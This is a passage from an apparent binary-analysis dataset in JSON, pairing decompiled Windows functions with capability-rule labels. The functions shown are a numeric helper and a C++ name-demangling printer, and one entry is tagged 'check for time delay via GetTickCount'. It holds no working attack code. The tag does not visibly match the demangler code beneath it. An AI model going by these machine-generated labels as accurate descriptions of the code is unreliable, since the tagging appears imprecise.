        "decompiled_code": "\nuint64_t fcn.140017880(int64_t arg1, int32_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    \n    uVar1 = arg1 + 0x18;\n    iVar2 = uVar1 + *(arg1 + 0x14) * 4;\n    uVar3 = *(iVar2 + -4);\n    uVar7 = 0x1f;\n    if (uVar3 != 0) {\n        for (; uVar3 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n        }\n    }\n    uVar7 = uVar7 ^ 0x1f;\n    *arg2 = 0x20 - uVar7;\n    if (10 < uVar7) {\n        uVar4 = uVar7 - 0xb;\n        if (uVar1 < iVar2 - 4U) {\n            uVar5 = *(iVar2 + -8);\n            uVar6 = uVar5;\n            if (uVar7 - 0xb != 0) {\n                uVar3 = uVar3 << (uVar4 & 0x1f) | uVar5 >> (0x20 - uVar4 & 0x1f);\n                uVar5 = uVar5 << (uVar4 & 0x1f);\n                uVar6 = uVar5;\n                if (uVar1 < iVar2 - 8U) {\n                    return CONCAT44(uVar3, uVar5 | *(iVar2 + -0xc) >> (0x20 - uVar4 & 0x1f)) | 0x3ff0000000000000;\n                }\n            }\n        }\n        else {\n            uVar6 = 0;\n            if (uVar7 != 0xb) {\n                return (uVar3 << (uVar4 & 0x1f) | 0x3ff00000) << 0x20;\n            }\n        }\n        return (uVar3 | 0x3ff00000) << 0x20 | uVar6;\n    }\n    uVar5 = 0;\n    uVar4 = 0xb - uVar7;\n    if (uVar1 < iVar2 - 4U) {\n        uVar5 = *(iVar2 + -8) >> (uVar4 & 0x1f);\n    }\n    return CONCAT44(uVar3 >> (uVar4 & 0x1f), uVar3 << (uVar7 + 0x15U & 0x1f) | uVar5) | 0x3ff0000000000000;\n}\n",
        "token_count": 626
    },
    "1400083b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00014000acf9: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000ada3: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b4a1: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140009a05: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b3ea: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b40e: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b30e: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b330: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b2ef: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000af5b: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000af7f: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000ab15: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000aa67: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b1c7: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000b203: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000aab4: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140009e4c: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000a6cf: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000ad50: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000ad91: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140008758: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000ace3: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00014000875d)\n// WARNING: Removing unreachable block (ram,0x00014000ac34)\n// WARNING: Removing unreachable block (ram,0x00014000ac6e)\n// WARNING: Removing unreachable block (ram,0x00014000aca2)\n// WARNING: Removing unreachable block (ram,0x00014000ac80)\n// WARNING: Removing unreachable block (ram,0x00014000acad)\n// WARNING: Removing unreachable block (ram,0x00014000ac87)\n// WARNING: Removing unreachable block (ram,0x00014000acd9)\n// WARNING: Removing unreachable block (ram,0x00014000ad96)\n// WARNING: Removing unreachable block (ram,0x00014000ad55)\n// WARNING: Removing unreachable block (ram,0x00014000a6d4)\n// WARNING: Removing unreachable block (ram,0x00014000a6fa)\n// WARNING: Removing unreachable block (ram,0x00014000a722)\n// WARNING: Removing unreachable block (ram,0x00014000a700)\n// WARNING: Removing unreachable block (ram,0x00014000a72e)\n// WARNING: Removing unreachable block (ram,0x00014000a707)\n// WARNING: Removing unreachable block (ram,0x00014000a75a)\n// WARNING: Removing unreachable block (ram,0x00014000b0b9)\n// WARNING: Removing unreachable block (ram,0x00014000a767)\n// WARNING: Removing unreachable block (ram,0x000140009e51)\n// WARNING: Removing unreachable block (ram,0x00014000aab9)\n// WARNING: Removing unreachable block (ram,0x00014000b208)\n// WARNING: Removing unreachable block (ram,0x00014000b1cc)\n// WARNING: Removing unreachable block (ram,0x00014000aa6c)\n// WARNING: Removing unreachable block (ram,0x00014000ab1a)\n// WARNING: Removing unreachable block (ram,0x00014000af84)\n// WARNING: Removing unreachable block (ram,0x00014000af60)\n// WARNING: Removing unreachable block (ram,0x00014000b2f4)\n// WARNING: Removing unreachable block (ram,0x00014000b335)\n// WARNING: Removing unreachable block (ram,0x00014000b313)\n// WARNING: Removing unreachable block (ram,0x00014000b3ef)\n// WARNING: Removing unreachable block (ram,0x00014000b413)\n// WARNING: Removing unreachable block (ram,0x00014000b42c)\n// WARNING: Removing unreachable block (ram,0x00014000b3f6)\n// WARNING: Removing unreachable block (ram,0x000140009a0a)\n// WARNING: Removing unreachable block (ram,0x00014000b4a6)\n// WARNING: Removing unreachable block (ram,0x00014000ada8)\n// WARNING: Removing unreachable block (ram,0x00014000acfe)\n// WARNING: Removing unreachable block (ram,0x00014000ace8)\n// WARNING: Removing unreachable block (ram,0x00014000876b)\n\nvoid fcn.1400083b0(uchar *arg1, ulong noname_1, uint32_t *arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int32_t *piVar5;\n    ulong *puVar6;\n    uint8_t *puVar7;\n    uint32_t *puVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    bool bVar13;\n    int32_t iVar14;\n    int64_t iVar15;\n    uint64_t uVar16;\n    int64_t *piVar17;\n    int64_t iVar18;\n    int32_t *piVar19;\n    int64_t iVar20;\n    int64_t *piVar21;\n    ulong uVar22;\n    int64_t *piVar23;\n    uint32_t *puVar24;\n    uint32_t **ppuVar25;\n    int64_t **ppiVar26;\n    uchar uVar27;\n    uint8_t uVar28;\n    uint32_t uVar29;\n    uchar *unaff_RBX;\n    uint64_t unaff_RBP;\n    int64_t iVar30;\n    char *pcVar31;\n    uint32_t **ppuVar32;\n    uchar *puVar33;\n    uint32_t *unaff_RSI;\n    uchar *puVar34;\n    uint64_t unaff_RDI;\n    uint64_t uVar35;\n    char *pcVar36;\n    uint32_t *puVar37;\n    ulong in_R9;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    ulong uStack256;\n    int64_t iStack216;\n    int32_t *piStack208;\n    ulong uStack200;\n    ulong uStack192;\n    int32_t aiStack184 [2];\n    ulong uStack176;\n    ulong uStack168;\n    uint auStack160 [12];\n    ulong uStack112;\n    ulong uStack80;\n    uchar auStack72 [8];\n    \n    if (arg3 == NULL) goto code_r0x000140008400;\n    uVar38 = *(arg1 + 0x130);\n    uVar35 = uVar38;\n    if (uVar38 != 0) {\n        return;\n    }\n    uVar39 = *arg3;\n    if (0x51 < uVar39) goto code_r0x000140008400;\n    // switch table (82 cases) at 0x1400ff6fc\n    switch(*(uVar39 * 4 + 0x1400ff6fc) + 0x1400ff6fc) {\n    case 0x140008400:\n        goto code_r0x000140008400;\n    case 0x140008420:\n        uStack200 = *(arg1 + 0x128);\n        piVar23 = uStack200;\n        if (uStack200 != NULL) {\n            do {\n                if (*(piVar23 + 2) == 0) {\n                    if (2 < *piVar23[1] - 0x19) break;\n                    if (uVar39 == *piVar23[1]) goto code_r0x000140008468;\n                }\n                piVar23 = *piVar23;\n            } while (piVar23 != NULL);\n            goto code_r0x000140008497;\n        }\n        puVar37 = *(arg3 + 4);\n        goto code_r0x0001400085b3;\n    case 0x140008490:\n        uStack200 = *(arg1 + 0x128);\ncode_r0x000140008497:\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        uStack176 = *(arg1 + 0x120);\n        goto code_r0x0001400084bf;\n    case 0x140008508:\n        uStack200 = *(arg1 + 0x128);\n        uVar22 = *(arg3 + 6);\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        uStack176 = *(arg1 + 0x120);\n        aiStack184[0] = 0;\n        uStack256 = 0x14000854c;\n        uStack192 = arg3;\n        fcn.14000b4c0(arg1, 0x11, uVar22);\n        if (aiStack184[0] == 0) {\n            uStack256 = 0x14000aace;\n            fcn.14000b560(arg1, 0x11, arg3);\n        }\n        *(arg1 + 0x128) = uStack200;\n        return;\n    case 0x140008570:\n        puVar24 = *(arg3 + 4);\n        uVar2 = *(arg1 + 0x138);\n        uVar29 = *puVar24;\n        puVar37 = puVar24;\n        if ((uVar2 == 0) && (uVar38 = 0,  uVar29 == 5)) {\n            iVar14 = *(arg1 + 0x158);\n            if (0 < iVar14) {\n                ppuVar25 = *(arg1 + 0x150);\n                ppuVar32 = ppuVar25 + iVar14 * 2;\n                do {\n                    if (puVar24 == *ppuVar25) {\n                        ppuVar32 = *(arg1 + 0x148);\n                        goto joined_r0x00014000afe7;\n                    }\n                    ppuVar25 = ppuVar25 + 2;\n                } while (ppuVar32 != ppuVar25);\n            }\n            if (*(arg1 + 0x15c) <= iVar14) goto code_r0x000140008400;\n            piVar23 = *(arg1 + 0x120);\n            ppuVar25 = iVar14 * 0x10 + *(arg1 + 0x150);\n            *(arg1 + 0x158) = iVar14 + 1;\n            ppuVar32 = ppuVar25 + 1;\n            *ppuVar25 = puVar24;\n            if (piVar23 != NULL) {\n                uVar35 = *(arg1 + 0x168);\n                iVar14 = *(arg1 + 0x16c);\n                iVar15 = uVar35 << 4;\n                ppuVar25 = ppuVar32;\n                do {\n                    if (iVar14 <= uVar35) goto code_r0x000140008400;\n                    puVar8 = piVar23[1];\n                    uVar38 = uVar35 + 1;\n                    uVar35 = uVar38;\n                    *(arg1 + 0x168) = uVar38;\n                    ppuVar32 = *(arg1 + 0x160) + iVar15;\n                    iVar15 = iVar15 + 0x10;\n                    ppuVar32[1] = puVar8;\n                    *ppuVar25 = ppuVar32;\n                    piVar23 = *piVar23;\n                    ppuVar25 = ppuVar32;\n                } while (piVar23 != NULL);\n            }\n            *ppuVar32 = NULL;\ncode_r0x00014000b00f:\n            uStack256 = 0x14000b01a;\n            uVar38 = uVar2;\n            puVar24 = fcn.140004d80(arg1, puVar24);\n            if (puVar24 == NULL) goto code_r0x000140008400;\n            goto code_r0x00014000b023;\n        }\n        goto code_r0x000140008591;\n    case 0x1400085f0:\n        piVar19 = *(arg3 + 4);\n        if (*piVar19 != 0x27) {\n            uVar38 = 0;\ncode_r0x000140008616:\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000adf8;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                piVar19 = *(arg3 + 4);\n                iVar15 = 0;\n                iVar18 = 1;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x28;\n            arg1[0x108] = 0x28;\n            uStack256 = 0x14000864c;\n            fcn.14000b4c0(arg1, 0x11, piVar19);\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000adc9;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x29;\n            arg1[0x108] = 0x29;\n            if (*arg3 == 0x3e) {\n                uVar27 = 0x2d;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x14000ada8;\n                unaff_RBX = arg1;\n                unaff_RSI = arg3;\n                goto code_r0x000140004d10;\n            }\n            if (uVar38 == 8) {\n                uVar27 = 0x5b;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x14000acfe;\n                unaff_RBX = arg1;\n                unaff_RSI = arg3;\n                goto code_r0x000140004d10;\n            }\n            goto code_r0x000140008690;\n        }\n        uVar38 = *(*(piVar19 + 4) + 0x1c);\n        if (6 < uVar38) {\n            if ((((uVar38 == 7) && (piVar5 = *(arg3 + 6),  *piVar5 == 0)) && (piVar5[6] == 1)) && (uVar39 == 0x3d)) {\n                if (**(piVar5 + 4) == '0') {\n                    pcVar36 = \"false\";\n                    goto code_r0x000140004de0;\n                }\n                if (**(piVar5 + 4) == '1') {\n                    pcVar36 = \"true\";\n                    goto code_r0x000140004de0;\n                }\n            }\n            goto code_r0x000140008616;\n        }\n        if ((uVar38 == 0) || (**(arg3 + 6) != 0)) goto code_r0x000140008616;\n        if (uVar39 == 0x3e) {\n            uVar27 = 0x2d;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000b4a6;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n            goto code_r0x000140004d10;\n        }\n        uStack256 = 0x14000aedd;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n        if (4 < uVar38 - 2) {\n            return;\n        }\n    // switch table (5 cases) at 0x1400ff844\n        switch(*((uVar38 - 2) * 4 + 0x1400ff844) + 0x1400ff844) {\n        case 0x14000aef6:\n            pcVar36 = 0x1400ff65e;\n            break;\n        case 0x14000af02:\n            pcVar36 = 0x1400ff65b;\n            break;\n        case 0x14000af0e:\n            uVar27 = 0x6c;\n            goto code_r0x000140004d10;\n        case 0x14000af18:\n            uVar27 = 0x75;\n            goto code_r0x000140004d10;\n        case 0x14000af22:\n            pcVar36 = 0x1400ff661;\n        }\n        goto code_r0x000140004de0;\n    case 0x140008690:\n        goto code_r0x000140008690;\n    case 0x1400086a0:\n        if (*(arg3 + 4) != 0) {\n            uStack256 = 0x1400086b3;\n            fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        }\n        if (*(arg3 + 6) == 0) {\n            return;\n        }\n        uVar35 = *(arg1 + 0x100);\n        uVar16 = uVar35;\n        if (0xfd < uVar35) {\n            arg1[uVar35] = 0;\n            uVar16 = 0;\n            uStack256 = 0x14000ab38;\n            (**(arg1 + 0x110))(arg1, uVar35, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            *(arg1 + 0x100) = 0;\n        }\n        puVar34 = 0x1400ff630;\n        do {\n            uVar27 = *puVar34;\n            if (uVar16 == 0xff) {\n                arg1[0xff] = 0;\n                uVar35 = 1;\n                uStack256 = 0x140008735;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                uVar16 = 0;\n            }\n            else {\n                uVar35 = uVar16 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = uVar35;\n            arg1[uVar16] = uVar27;\n            arg1[0x108] = uVar27;\n            uVar16 = uVar35;\n        } while (puVar34 != 0x1400ff632);\n        iVar14 = *(arg1 + 0x140);\n        uStack256 = 0x14000a56a;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n        if (*(arg1 + 0x140) != iVar14) {\n            return;\n        }\n        if (*(arg1 + 0x100) != uVar35) {\n            return;\n        }\n        *(arg1 + 0x100) = uVar35 - 2;\n        return;\n    case 0x140008740:\n        uStack256 = 0x14000874e;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        pcVar36 = 0x1400ff485;\n        *0x20 = &stack0xffffffffffffff00;\n        uStack256 = 0x14000875d;\n        unaff_RBX = arg1;\n        unaff_RBP = uVar35;\n        unaff_RSI = arg3;\n        goto code_r0x000140004de0;\n    case 0x140008773:\n        piVar19 = *(arg3 + 4);\n        uVar22 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        if (piVar19 != NULL) {\n            iVar15 = *(arg1 + 0x120);\n            piVar23 = &stack0xffffffffffffff38;\n            piVar21 = 0;\n            uVar38 = 0;\n            do {\n                piVar17 = piVar23;\n                *piVar17 = piVar21;\n                uVar39 = uVar38 + 1;\n                *(piVar17 + 2) = 0;\n                iVar14 = *piVar19;\n                piVar17[1] = piVar19;\n                piVar17[3] = iVar15;\n                if ((0x35 < iVar14 - 0x1cU) || ((0x3400000000001fU >> (iVar14 - 0x1cU & 0x3f) & 1) == 0)) {\n                    *(arg1 + 0x128) = piVar17;\n                    if (iVar14 != 2) goto code_r0x0001400087f0;\n                    piVar19 = *(piVar19 + 6);\n                    if ((*piVar19 == 0x48) && (piVar19 = *(piVar19 + 4),  piVar19 == NULL)) goto code_r0x000140008400;\n                    piVar23 = &stack0xffffffffffffff38 + uVar38 * 4 * 8;\n                    ppiVar26 = &stack0xffffffffffffff38 + uVar39 * 4 * 8;\n                    goto code_r0x00014000ae3c;\n                }\n                piVar19 = *(piVar19 + 4);\n                if (piVar19 == NULL) {\n                    *(arg1 + 0x128) = piVar17;\n                    goto code_r0x000140008400;\n                }\n                piVar23 = piVar17 + 4;\n                piVar21 = piVar17;\n                uVar38 = uVar39;\n            } while (uVar39 != 4);\n            *(arg1 + 0x128) = piVar17;\n        }\n        goto code_r0x000140008400;\n    case 0x1400088a5:\n        pcVar36 = \"decltype (\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000890d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        uVar22 = *(arg3 + 4);\ncode_r0x000140009918:\n        uStack256 = 0x140009925;\n        fcn.14000b4c0(arg1, 0x11, uVar22);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000a841;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x29;\n        arg1[0x108] = 0x29;\n        return;\n    case 0x14000891d:\n        puVar34 = &stack0xffffffffffffff38;\n        uStack256 = 0x140008935;\n        fcn.140004c90(puVar34, 0x1400ff08c, arg3[4], in_R9);\n        uStack256 = 0x14000893d;\n        iVar15 = sub.msvcrt.dll_strlen(puVar34);\n        if (iVar15 == 0) {\n            return;\n        }\n        puVar33 = puVar34 + iVar15;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400089ae;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != puVar33);\n        return;\n    case 0x1400089be:\n        iVar15 = *(arg1 + 0x100);\n        uVar38 = arg3[4];\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000ab97;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = uVar38;\n        arg1[0x108] = uVar38;\n        return;\n    case 0x1400089f0:\n        uStack256 = 0x1400089fe;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\ncode_r0x000140008690:\n        unaff_RSI = *(arg3 + 6);\n        goto code_r0x00014000b4c0;\n    case 0x140008a03:\n        pcVar36 = \"non-virtual thunk to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008a6d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140008a7d:\n        pcVar36 = \"construction vtable for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008ae5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        pcVar36 = \"-in-\";\n        uStack256 = 0x14000a1e1;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000a23d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        goto code_r0x000140008690;\n    case 0x140008af5:\n        pcVar36 = \" [clone \";\n        uStack256 = 0x140008b0e;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008b6d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\ncode_r0x00014000a0c0:\n        uStack256 = 0x14000a0d1;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000a89f;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x5d;\n        arg1[0x108] = 0x5d;\n        return;\n    case 0x140008b7d:\n        puVar34 = *(arg3 + 4);\n        if (arg3[6] == 0) {\n            return;\n        }\n        puVar33 = puVar34 + arg3[6];\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008bed;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != puVar33);\n        return;\n    case 0x140008bfd:\n        pcVar36 = \"hidden alias for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008c65;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140008c75:\n        if (arg3[4] == 0) {\n            pcVar36 = \"this\";\n        }\n        else {\n            pcVar36 = \"{parm#\";\n            unaff_RSI = &stack0xffffffffffffff38;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000a6d4;\n            unaff_RBX = arg1;\n            unaff_RBP = uVar35;\n            unaff_RDI = arg3[4];\n        }\n        goto code_r0x000140004de0;\n    case 0x140008ca3:\n        if (*(arg1 + 0x138) != 0) {\n            pcVar36 = \"auto:\";\n            iVar15 = *(arg1 + 0x100);\n            do {\n                cVar1 = *pcVar36;\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x140008d1d;\n                    (**(arg1 + 0x110))(arg1);\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                pcVar36 = pcVar36 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = cVar1;\n                arg1[0x108] = cVar1;\n                iVar15 = iVar18;\n            } while (pcVar36 != \"\");\n            puVar34 = &stack0xffffffffffffff38;\n            uStack256 = 0x14000a79d;\n            fcn.140004c90(puVar34, 0x1400ff08c, arg3[4] + 1, in_R9);\n            uStack256 = 0x14000a7a5;\n            iVar15 = sub.msvcrt.dll_strlen(puVar34);\n            if (iVar15 == 0) {\n                return;\n            }\n            puVar33 = puVar34 + iVar15;\n            iVar15 = *(arg1 + 0x100);\n            do {\n                uVar27 = *puVar34;\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000a80e;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                puVar34 = puVar34 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = uVar27;\n                arg1[0x108] = uVar27;\n                iVar15 = iVar18;\n            } while (puVar33 != puVar34);\n            return;\n        }\n        uStack256 = 0x14000a678;\n        puVar34 = arg1;\n        piVar19 = fcn.140004d80(arg1, arg3);\n        if (piVar19 != NULL) {\n            if ((*piVar19 != 0x2f) || (iVar14 = *(puVar34 + 0x13c),  iVar14 < 0)) {\ncode_r0x00014000a8bf:\n                puVar6 = *(arg1 + 0x120);\n                *(arg1 + 0x120) = *puVar6;\n                uStack256 = 0x14000a8dd;\n                fcn.14000b4c0(arg1, 0x11, piVar19);\n                *(arg1 + 0x120) = puVar6;\n                return;\n            }\n            while (iVar14 != 0) {\n                piVar19 = *(piVar19 + 6);\n                iVar14 = iVar14 + -1;\n                if ((piVar19 == NULL) || (*piVar19 != 0x2f)) goto code_r0x000140008400;\n            }\n            piVar19 = *(piVar19 + 4);\n            if (piVar19 != NULL) goto code_r0x00014000a8bf;\n        }\n        goto code_r0x000140008400;\n    case 0x140008d2d:\n        pcVar36 = \"typeinfo for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008d95;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while 